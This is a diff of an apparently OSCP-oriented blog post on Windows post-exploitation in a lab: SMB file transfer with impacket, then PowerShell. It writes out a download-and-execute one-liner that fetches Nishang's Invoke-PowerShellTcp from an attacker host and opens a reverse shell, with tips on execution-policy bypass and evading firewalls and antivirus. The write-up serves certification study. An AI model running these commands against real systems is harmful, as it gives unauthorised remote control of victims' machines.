@@ -9,15 +9,14 @@ As stated in the [OSCP Review Post](/oscp/OSCP-Review), I came across many good 
 {: .text-justify}
 
 ---
-
 ## File transfer over SMB
 
 While there are numerous methods to transfer files from your host Kali to victim Windows, I found SMB to be the most reliable one. 
 - Install impacket on your kali (It comes preinstalled most of the times, located at /usr/share/impacket/examples/).
-- Start the SMB server by running `smbserver.py`:
+- Start the SMB server by running `smbserver.py`:  
 ![image-center](/assets/images/oscp/1/smbserver.png)
 This will share the `/tmp/smbshare` directory over smb as `myshare`.
-- All the files inside `/tmp/smbshare` can now directly be accessed on the victim windows:
+- All the files inside `/tmp/smbshare` can now directly be accessed on the victim windows:  
 ![image-center](/assets/images/oscp/1/smbshare.png)
 - For more convenience, this SMB share can be  mounted directly on the windows as a drive:
 	- Check currently mounted shares by running `net view`:
@@ -29,8 +28,8 @@ This will share the `/tmp/smbshare` directory over smb as `myshare`.
 - The mount can be disconnected with command `net use Z: /d` once you are done with it.  
 Another easy way to transfer files is over http using python's SimpleHTTPServer. We will take a look at it and download files using PowerShell in the following section.
 {: .text-justify}
----
 
+---
 ## PowerShell
 
 PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Two of the most useful modules that I came across were: [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)   
@@ -54,9 +53,9 @@ We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victi
 1. Start python's `SimpleHTTPServer` and copy the `Invoke-PowerShellTcp.ps1` to that directory.   
 ![image-center](/assets/images/oscp/1/httpps1.png)
 2. Start netcat listener on your Kali (always prefer using standard ports such as 80,443,53 since they have less chances of being blacklisted on the victim's firewall).
-3. On the victim, we can download and execute this script using command: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
+3. On the victim, we can download and execute this script using command: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`   
 ![image-center](/assets/images/oscp/1/httpps2.png)
-4. This sends an interactive reverse PowerShell to our kali on port 443:
+4. This sends an interactive reverse PowerShell to our kali on port 443:  
 ![image-center](/assets/images/oscp/1/httpps3.png) 
 5. This script can also be used to setup a bind shell on the victim using `-Bind` switch but I preferred using reverse shells in the PWK lab.
 {: .text-justify}
@@ -64,7 +63,7 @@ We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victi
 ### Method 2: Using SMB (Gets blocked by Windows AV)
 
 While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
-1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver.
+1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver.  
 ![image-center](/assets/images/oscp/1/ps1.png)
 2. Start netcat listener on Kali.
 3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
@@ -76,7 +75,6 @@ While this method is convenient for sharing multiple files over smb, but since w
 {: .text-justify}
 
 ---
-
 ### Command breakdown
 
 Let's see the breakdown:   
@@ -84,14 +82,13 @@ Let's see the breakdown:
 1. `-nop` or `NoProfile` : This option means that the currently active user’s profile will not be loaded.
 2. `-ep bypass` or `-ExecutionPolicy Bypass` : Execution Policy restricts script execution on most systems on the default setting This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter. 
 3. `-c` or `-Command` : This is used to specify a command to be executed.
-4. `"iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))` : This part of the command downloads the `Invoke-PowerShellTcp.ps1` file.
-5. `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"` : These are the arguments passed to `Invoke-PowerShellTcp.ps1` module. More arguments or examples can be seen on Nishang's github.
-6. Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore:
+	- `"iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))` : This part of the command downloads the `Invoke-PowerShellTcp.ps1` file.
+	- `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"` : These are the arguments passed to `Invoke-PowerShellTcp.ps1` module. More arguments or examples can be seen on Nishang's github.
+	- Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore:
 	`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
 {: .text-justify}
 
 ---
-
 ## lpeworkshop
 For the setup, we need three things:
 1. Windows 7/10
@@ -105,7 +102,6 @@ The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run 
 {: .text-justify}
 
 ---
-
 ## Additional resources
 
 - https://hacknpentest.com/windows-privilege-escalation-using-powershell/
